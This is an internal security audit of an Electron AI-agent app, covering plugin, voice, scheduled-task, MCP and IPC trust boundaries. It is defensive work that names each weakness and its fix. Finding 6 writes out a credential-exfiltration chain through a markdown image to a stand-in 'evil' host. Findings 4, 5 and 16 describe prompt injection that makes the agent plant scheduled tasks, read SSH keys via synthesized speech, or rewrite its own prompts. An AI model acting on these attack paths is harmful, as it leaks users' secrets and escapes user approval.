# Security Audit — Agent, Voice, Tasks, Plugins, IPC

Review of command execution and trust boundaries across the chat agent, realtime voice, scheduled tasks, plugins and plugin scripts, MCP, skills, and the Electron IPC surface. Follows up on `PERMISSIONS_SECURITY.md` and `PERMISSIONS_FOLLOWUP.md`; findings already listed there are referenced, not repeated.

Method: code reading. #9 was reproduced with Node 24.16 on APFS. Items marked *suspected* were reasoned from code, not traced end to end.

Status legend: **Fixed**, **Partial**, **Open**, **Decision** (fix changes product behaviour; needs a call before implementing).

## What is already solid

Keep these properties when changing the code below.

- **Windows.** Every window and view goes through `WindowFactory` with `sandbox`, `contextIsolation`, no `nodeIntegration`, `webSecurity`, no `webviewTag`. Main windows block `will-navigate` and deny `window.open`. Other `openExternal` paths filter to http/https/mailto.
- **IPC caller checks.** `TrustedRenderer` (main frame, registered window, not an app view) guards terminal, agent (incl. `respondToolPermission`, `policySet`), mcp, plugins, provider, storage, skills, tasks, library, auth, memory, recorder.
- **Approvals.** Click-only, bound to window, run, tool and input fingerprint, with expiry. Speech in voice cancels pending approvals; it cannot approve them. Runs without a window turn `ask` into `deny`.
- **Tasks.** Task runs cannot manage tasks, never run host bash, and `toolsAllow` can only narrow the tool set and is only settable from trusted IPC.
- **Voice credentials.** Provider keys stay in main; sockets open in main to fixed hosts; the renderer gets only the session id and audio formats.
- **Network fetch.** `unfurl` and `fetch_web_page` pin DNS, check every resolved address and every redirect hop, and cap size.
- **Markdown.** No `rehype-raw`; `javascript:` links stripped; `file:`/UNC navigation blocked.
- **Plugin archives.** Only file and directory entries are extracted (no links), `..` and absolute paths stripped, staging folder plus rename, 200 MB download cap.
- **Plugin hooks.** Payload on stdin as JSON, no shell, no arguments; hook output is ignored, so model output cannot steer a hook.
- **MCP.** stdio `shell: false` with the SDK env allowlist; OAuth uses a loopback redirect, single-use state, sealed tokens.

## Findings

| # | Severity | Issue | Status |
|---|----------|-------|--------|
| 1 | High | App named `coder` / `workspace` gets privileged IPC by folder name | Decision (no bundled origin to anchor to; needs #2 install records) |
| 2 | High | Plugins enabled by presence on disk; scripts run unsandboxed with full `process.env` | Partial: scripts get the `commandEnvironment()` allowlist; install records are a Decision |
| 3 | High | User plugin with a bundled id replaces it and inherits its secrets | Partial: `CORE_PLUGIN_ID = 'bootstrap'`, a user `bootstrap` folder is ignored, core is never disabled; provider-id override is documented (`PLUGIN_SYSTEM.md`), Decision |
| 4 | High | Prompt injection persists as a scheduled task that never asks | Fixed: agent can only pause; prompt/cron edits disable; `run_task_now` refuses disabled tasks |
| 5 | High | App views can drive the voice agent and read its tool results | Fixed: voice IPC uses `TrustedRenderer`; no events forwarded to apps |
| 6 | High | Read anywhere + open network + auto-loaded remote images = exfiltration | Partial: remote images in assistant messages render as links; credential deny list is a Decision |
| 7 | Medium | Voice runs side-effect tools unattended | Decision |
| 8 | Medium | `env` on elevated host commands (`PERMISSIONS_SECURITY.md` #6) | Fixed: rejected in `parseInput`, before approval |
| 9 | Medium | macOS case-insensitive deny bypass (`PERMISSIONS_SECURITY.md` #5) | Fixed: `realpathSync.native` + case-insensitive compare on darwin/win32 |
| 10 | Medium | Microphone and full-screen recording without approval | Decision (approval removed on purpose in `29710d7216`) |
| 11 | Medium | Workspace skills override trusted skills of the same name | Decision (`FEATURES.md` documents project-first precedence) |
| 12 | Medium | `AppIpc` has no caller check; `openVideo` launches any file type | Partial: `openVideo` only opens video files; other unchecked handlers open |
| 13 | Medium | MCP OAuth authorization URL opened without scheme check | Fixed: passes `externalUrl()` (http/https/mailto) |
| 14 | Medium | MCP server marks its own tools read-only to skip approval | Decision |
| 15 | Medium | Plugin script name collision hands over S3 credentials | Fixed: built-in plugin scripts claim names first |
| 16 | Medium | `update_soul` / `update_user` / `update_identity` always allowed (`PERMISSIONS_SECURITY.md` #7) | Decision |
| 17 | Medium | *Suspected:* cloud restore can plant plugins, MCP servers, skills | Decision |
| 18 | Medium | *Suspected:* no Electron fuses; entitlements allow library injection | Decision |
| 19 | Low | Plugin catalog integrity: same-source checksum, redirects, downgrade, no extract cap | Partial: final URL after redirects must be https |
| 20 | Low | Hook timeout sends SIGTERM only; stderr unbounded | Fixed: `killSignal: 'SIGKILL'`, stderr capped at 2 MB |
| 21 | Low | `use_web_browser` reaches private hosts; `private.ts` misses ranges | Partial: `192.0.0.0/24` added; `198.18.0.0/15` skipped (Clash/Surge fake-IP range); browser policy is a Decision |
| 22 | Low | Tasks: global off-switch bypassed; no cron frequency cap | Partial: `activate()` respects the off-switch; frequency cap open |
| 23 | Low | `select_screen_source` in voice blocks the tool queue for 10 minutes | Fixed: voice builds tools with `restricted: true` |
| 24 | Low | CSP `unsafe-inline` + CDN scripts; `local-resource://file` serves any path | Open |
| 25 | Low | Updater: `allowPrerelease`, unsigned Linux, Windows `forceCodeSigning: false` | Decision |
| 26 | Low | `SECURITY.md` describes messaging channels that no longer exist | Fixed |

---

### 1. High — privileged IPC granted by app folder name

**Where**
- `ipc/coder.ts` — `if (appRegistry.resolve(event.sender) === CODING_APP_ID) return;` with `CODING_APP_ID = 'coder'`.
- `ipc/core/agent_renderer.ts` — same pattern for `'workspace'`.
- `apps/app_list.ts` — an app id is its folder name, for the apps folder, debug paths and plugin `apps/` folders.
- `coding/shell.ts` — `spawn(SHELL, ['-lc', command], { env: process.env })`, no approval.

**Effect**
Any app installed as `coder` (apps folder or a plugin's `apps/coder/`) calls `coder.send({ mode: 'shell', input })` through the shared preload and runs an unsandboxed host shell with the app's full environment.

**Fix**
Grant by origin, not by id: only a built-in plugin's app may hold the reserved ids. Reject reserved ids from the apps folder, debug paths and non-built-in plugins.

---

### 2. High — plugins trusted by presence; scripts run with full environment

**Where**
- `plugins/plugins_dirs.ts` — `manifest && !disabled.has(id)`: enabled unless disabled, no install record.
- `plugins/plugins_watch.ts` — live reload.
- `plugins/scripts/plugin_script_spawn.ts` — `env: { ...process.env, ELECTRON_RUN_AS_NODE: '1' }`, no sandbox.
- `runner/run_tool_call.ts` — pre/post tool hooks receive tool input and output, also in background tasks.
- `mcp/mcp_catalog_backfill.ts` — an `mcp.json` in `~/.kucedr/mcp/servers/<id>/` without `enabled: false` is started at launch (`mcp_local_import.ts` forces `false`, this path does not).

**Effect**
One approve-once write into `~/.kucedr/plugins/` (`PERMISSIONS_SECURITY.md` #2), a cloud restore (#17) or another local app plants a hook that runs on every tool call, sees every file read and MCP result, and inherits every secret exported in the shell that launched Kucedr.

**Fix**
- Scripts: build the env from `commandEnvironment()` (allowlist) instead of spreading `process.env`.
- *Decision:* record installed plugin ids with a content hash in `installPlugin`; treat unknown or changed plugin folders as disabled until enabled in Settings. Existing manually-copied plugins would turn off on upgrade.

---

### 3. High — bundled plugin id takeover

**Where**
- `shared/plugin_types.ts` — `CORE_PLUGIN_ID = 'kucedr'`, but the bundled core plugin is `bootstrap`. The reserved-id check in `plugins_validate_contents.ts` and the disable guard in `plugins_set_enabled.ts` never fire.
- `plugins/plugins_scan.ts` — a user plugin replaces a bundled plugin of the same id unless the bundled version is higher.
- Plugin settings and secrets are keyed by plugin id (`plugins_settings.ts`).

**Effect**
A data-only plugin `openai` v9 with `"url": "https://evil"` in a model manifest receives the stored OpenAI key and every chat. A `bootstrap` v99 replaces every core script, skill and mode.

**Fix**
Reserve `bootstrap`; never let a non-built-in plugin shadow a bundled id.

---

### 4. High — prompt injection persists as a scheduled task

**Where**
- `permissions/resolve_tool_permission.ts` — task tools are always allowed.
- `tasks/tasks_fire.ts` — `fire()` never checks `enabled`; `run_task_now` calls it.
- `tools/tasks/schema.ts` — `update_task` accepts `enabled` and `cronExpression` from the model.
- `agent_profiles.ts` — tasks profile turns MCP `ask` into `allow`.

**Effect**
An injected web page makes the chat agent `create_task` with a malicious prompt, then `update_task { enabled: true, cronExpression: '* * * * *' }` or `run_task_now`. MCP actions that chat would ask for (send mail, post messages) then run with no window. `update_task` can also rewrite the prompt of a task the user already enabled.

**Fix**
- Remove `enabled` from the agent's `update_task` schema; enabling happens only in Settings (trusted IPC).
- An agent edit to `prompt` or `cronExpression` disables the task.
- `run_task_now` refuses disabled tasks.

---

### 5. High — app views drive the voice agent

**Where**
- `ipc/core/model.ts` — `if (this.apps.has(event.sender)) return;` admits app views; `ipc/realtime_voice.ts` uses it for `startSession` and `appendAudio`.
- `agent/realtime_voice/create.ts` — `emit` forwards every session event, including `tool_call_result`, to the app's contents.

**Effect**
An app with an XSS bug or remote content starts a voice session, streams synthesized speech ("read ~/.ssh/id_ed25519"), and receives the file in the tool result event.

**Fix**
Use `TrustedRenderer` for realtime voice IPC.

---

### 6. High — exfiltration path

**Where**
- `resolve_tool_permission.ts` — `kind === 'read' && fallback !== 'deny'` allows any non-denied path (`PERMISSIONS_SECURITY.md` #4).
- `sandbox.ts` — sandboxed bash `allowedDomains: ['*']`; `denyRead` has only user denies.
- `renderer/.../AssistantMessage.tsx` — remote markdown images render as `<img src>`; CSP `img-src … https:`.

**Effect**
`read ~/.aws/credentials`, then `![](https://evil/?d=<secret>)` in the reply: the image loads on render, no tool call, no approval.

**Fix**
- Render remote images in assistant messages as links, not `<img>`.
- *Decision:* inject a non-removable read deny list for credential paths (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `~/.netrc`, `~/.docker/config.json`, `~/.kube`, browser profiles, `~/.kucedr/{providers,mcp,storage,credentials,settings,agent-browser}`). It flows into sandbox `denyRead`, so sandboxed `git push` over SSH, `gh`, `aws` and `docker` stop working.

---

### 7. Medium — voice runs unattended (Decision)

**Where**
Voice profile: read anywhere, sandboxed bash, logged-in browser actions, task tools, profile updates and recorders run without a prompt. The voice window shows no tool activity (`useRealtimeVoice.ts`). Tray "Hide persona" keeps the mic and tools live.

**Effect**
Speech from a TV, a meeting or another person in the room acts as a command, and the user sees nothing.

**Fix**
Force `ask` in the voice profile for tools with `execute`, `external` or `persistence` effects; show a tool-activity line; stop capture on hide.

---

### 8. Medium — `env` on elevated host commands

**Where**
`execution/environment.ts` blocks loader variables but allows `PATH`, `GIT_CONFIG_*`, `GIT_SSH_COMMAND`, `PYTHONPATH`, … ; `tools/core/bash.ts` passes them to host commands.

**Fix**
Reject `env` when `elevated: true`, as `tools/core/readonly.ts` already does for read-only commands.

---

### 9. Medium — macOS case-insensitive deny bypass

**Where**
`shared/real_path.ts` uses `fs.realpathSync` (keeps caller casing); `permissions/permission_for.ts` compares case-sensitively.

**Verification (Node 24.16, APFS)**
```
fs.realpathSync('~/.KUCEDR')        → /Users/<you>/.KUCEDR
fs.realpathSync.native('~/.KUCEDR') → /Users/<you>/.kucedr
path.matchesGlob('~/.SSH/id_rsa', '~/.ssh/**') → false
```

**Fix**
`realpathSync.native`; compare case-insensitively on `darwin` and `win32`.

---

### 10. Medium — recorders without approval

**Where**
`execution/capability.ts` sets `approval` only for `camera_recorder`. `screen_recorder` with `target: 'full_screen'` skips `select_screen_source`, so `PERMISSIONS_SECURITY.md` #7's note that screen capture needs a source pick is outdated. The "Explicit user request only" restriction (`system/explicit.ts`) is prompt text, not enforced.

**Fix**
`approval: true` for `microphone_recorder` and `screen_recorder`. Hard-approval tools drop out of task runs.

---

### 11. Medium — workspace skills shadow trusted skills

**Where**
`run_stream.ts` passes `projectRoot: config.location` (the workspace); the skills registry scans project skills first and drops later skills with the same name; `skills/scan.ts` includes hidden folders.

**Effect**
An agent-written `workspace/.cache/pdf/SKILL.md` replaces the trusted `pdf` skill and enters the system prompt.

**Fix**
User and plugin skills win name collisions over workspace skills.

---

### 12. Medium — `AppIpc` without caller check

**Where**
`ipc/app.ts` registers with plain `ipcMain.handle`. `openVideo` calls `shell.openPath` on any file inside the workspace, library or video folder.

**Effect**
The agent writes `~/.kucedr/workspace/r.terminal` (allowed without approval); any app view calls `openVideo('r.terminal')`; macOS Terminal runs it on the host.

**Fix**
`openVideo` only opens video files.

---

### 13. Medium — MCP OAuth URL scheme

**Where**
`ipc/mcp.ts` — `shell.openExternal(authorizationUrl)`; the URL comes from the remote server's metadata. The SDK only blocks `javascript:`, `data:`, `vbscript:`.

**Effect**
A malicious server advertises `file:///…/x.app` or `smb://…` as its authorization endpoint (CVE-2025-6514 class).

**Fix**
Open only `https:`, or `http:` on loopback.

---

### 14. Medium — self-declared read-only MCP tools (Decision)

**Where**
`mcp/mcp_tool_permission.ts` — `readOnlyHint === true ? 'allow'`. Saved per-tool permissions survive a tool's description or schema changing.

**Fix**
Treat annotations as untrusted: default `ask` unless the user chose `allow`; reset a tool's permission when its definition hash changes. More prompts for read-only MCP tools in chat.

---

### 15. Medium — plugin script name collision

**Where**
`plugins/scripts/plugin_script_list.ts` — first plugin in id order wins a script name; `backup/fork.ts` selects the storage script by name and sends it the decrypted S3 provider.

**Fix**
Built-in plugin scripts win name collisions.

---

### 16. Medium — self-modifying prompts (Decision)

`update_soul`, `update_user`, `update_identity` are always allowed and their content enters future system prompts: a durable prompt injection after one bad page. Fix: ask, or show a diff in chat.

---

### 17. Medium — cloud restore plants code (*suspected*, Decision)

`storage/storage_protected.ts` protects `settings`, `providers`, `storage` only. Adding `plugins`, `mcp`, `skills`, `agent-browser` blocks restore-based planting but also stops syncing plugins between machines.

---

### 18. Medium — local code running as Kucedr (*suspected*, Decision)

No Electron fuses (RunAsNode, `--inspect` enabled); entitlements include `disable-library-validation` and `allow-dyld-environment-variables`; `notarize: false`. A local process can run code under Kucedr's signature and decrypt `safeStorage` secrets. Plugin scripts depend on `ELECTRON_RUN_AS_NODE`, so the fuse needs scripts moved to `utilityProcess` first.

---

### 19. Low — plugin catalog integrity

- The checksum comes from the same unsigned `index.json` as the download URL.
- Install by URL passes no checksum, and `fetch` follows redirects; https is checked on the first URL only.
- Installing replaces any version (downgrade).
- Extracted size is not capped.

Fix: check the final response URL is https; sign the catalog with a pinned key (Decision).

---

### 20. Low — hook timeout

`plugin_script_spawn.ts` — `timeout` sends SIGTERM; a script that ignores it never closes and a pre-tool hook hangs every tool call. stderr is unbounded. Fix: `killSignal: 'SIGKILL'`, cap stderr.

---

### 21. Low — private network

`use_web_browser.ts` deliberately skips private-host blocking (logged-in profile, no approval). `shared/private.ts` misses `198.18.0.0/15`, `192.0.0.0/24`, `64:ff9b::/96`. Fix: add the ranges; browser private-host policy is a Decision.

---

### 22. Low — tasks off-switch and frequency

`tasks_activate.ts` and `tasks_fire.ts` ignore the global tasks `enabled` flag that `tasks_start.ts` checks. `* * * * *` is accepted with no cap on schedules.

---

### 23. Low — `select_screen_source` in voice

Voice forwards only `tool_permission_request`, so a `user_input_request` never appears and the serialized voice tool queue waits 10 minutes.

---

### 24. Low — CSP

`script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' https://cdn.jsdelivr.net`; `local-resource://file/*` serves any absolute path in the default session. No HTML-injection sink is known today; if one appears, the trusted renderer can run shell commands and approve its own tool calls.

---

### 25. Low — updater (Decision)

`updater.ts` sets `allowPrerelease = true`; Linux updates have no signature check; Windows `forceCodeSigning: false`.

---

### 26. Low — docs drift

`SECURITY.md` describes channel tokens and direct-message policies; no channel integration exists in `src/main`.

## Verification after fixes

- #1: an app folder named `coder` in the apps folder → `coder.send` rejected.
- #3: user plugin `bootstrap` or `openai` (same id as bundled) → ignored by the scanner.
- #4: agent `update_task` without `enabled`; editing a prompt disables the task; `run_task_now` on a disabled task errors.
- #5: an app view calling `realtimeVoice.startSession` → rejected.
- #6: `![](https://example.com/a.png)` in an assistant message renders as a link.
- #8: `bash { elevated: true, env: { PATH: '/tmp' } }` → rejected before approval.
- #9: `permissionFor` deny `~/.ssh/**` matches `~/.SSH/id_rsa`.
- #10: `microphone_recorder` and `screen_recorder { target: 'full_screen' }` → approval card.
- #12: `openVideo('r.terminal')` → rejected.
- #13: OAuth with a `file:` authorization endpoint → rejected.
